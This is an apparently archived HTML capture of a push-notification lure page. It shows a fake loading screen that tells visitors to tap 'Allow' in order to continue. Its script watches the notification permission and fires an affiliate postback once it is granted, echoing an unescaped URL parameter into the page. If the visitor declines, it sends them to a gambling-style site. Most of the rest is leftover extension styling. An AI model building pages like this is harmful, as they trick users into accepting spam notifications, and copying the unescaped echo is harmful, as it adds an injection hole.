<!DOCTYPE html>
<html lang="en" data-scrapbook-source="https://get.thenewsnotifications.com/?pid=54814&amp;subid=2562909&amp;clickid=152529459424014336&amp;pgs=1" data-scrapbook-create="20190515143554750">
<head>
<title>NotifyTB</title><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimal-ui"><link href="css.css" rel="stylesheet"><link rel="dns-prefetch" href="https://cdnjs.cloudflare.com/"><link rel="manifest" href="https://get.thenewsnotifications.com/manifest.json"><style>*{-webkit-box-sizing:border-box;box-sizing:border-box}body,div,html{margin:0;padding:0;background-color:#2b2c2f}img{vertical-align:top;position:relative;left:0%;right:0%;width:100%;max-width:800px}body,html{width:100%;height:100%}body{font-family:-apple-system,Roboto,Helvetica Neue,Trebuchet MS,sans-serif;font-size:100%}.wrapper{display:block;text-align:center;left:0;right:0;bottom:0;top:0;position:fixed}.progressBar{height:150px;width:200px;background-repeat:no-repeat;background-position:center;margin:0 auto;background-image:url("3d7692a3d1c87050639bf9cbb55fd7d337068b27.gif")}.text{color:#fff;position:relative;font-family:'PT Sans',sans-serif;font-size:20px;margin-top:calc(75vh - 140px)}.allow-arrow{width:36px;animation:allow .5s ease-in-out 0s infinite}@keyframes allow{0%{margin-top:0}50%{margin-top:-10px}}@media(min-width:1281px){.wrapper{margin-top:calc(15vh)}.progressBar img{vertical-align:top;position:relative;left:0%;right:0%;width:100%;max-width:800px}.text{top:150px;left:50px;position:fixed;margin-top:initial}}.text-edge{position:relative;left:initial}.allow-arrow-edge{transform:rotate(180deg)}</style><script></script><script></script><script></script><script></script><script></script><script></script><style type="text/css">
@font-face {
  font-weight: 400;
  font-style:  normal;
...
}</style><style type="text/css">/*.lleo_errorSelection *::-moz-selection,
...
#lleo_dialog #lleo_sound {
    ...
    background: url("48ace63393ddac35e9c7a773aa297ffd8383639c.png") !important;
}
...
#lleo_dialog .ll-translation-marker {
    background: url("9e6cbcecc11b58230776fff131e583b251fb0dfc.png") !important;
...
#lleo_icons a {
    ...
    background: url("8df8342039f7e775e0c6d4d909562affa7a6f866.png") !important;
}
#lleo_icons a:hover {
    opacity: 1 !important;
}
...
#lleo_youtubeExportBtn {
    ...
    #lleo_youtubeExportBtn i {
        ...
        width: 16px;
        height: 16px;
        background: 0 0 url("i16.png") !important;
    }
...
<body><div class="wrapper"><div class="progressBar"><img src=""></div><div class="text">Please tap the <strong style="font-size:25px"><span class="cta">Allow</span>&nbsp;</strong><img class="allow-arrow" src="bc7aa1ab915664bc17040df61bbb4117348bb631.svg"> button to continue</div></div><script></script>
</body><loom-container id="lo-engage-ext-container"><loom-shadow classname="resolved"></loom-shadow></loom-container>
...
if (Notification.permission == 'default') {
  var grantedch = setInterval(function () {
    if (Notification.permission == 'granted') {
      ...
      $.ajax({
        url: "/postback.php?subid=<?= $_GET['subid']; ?>",
        method: "POST"
      });
    }
    else if(Notification.permission == 'denied') {
      clearInterval(grantedch);
      window.location.href = 'https://richplayland.com/2117r/?refCode=wp_w25299p43_';
    }
  }, 500);
}
</script>
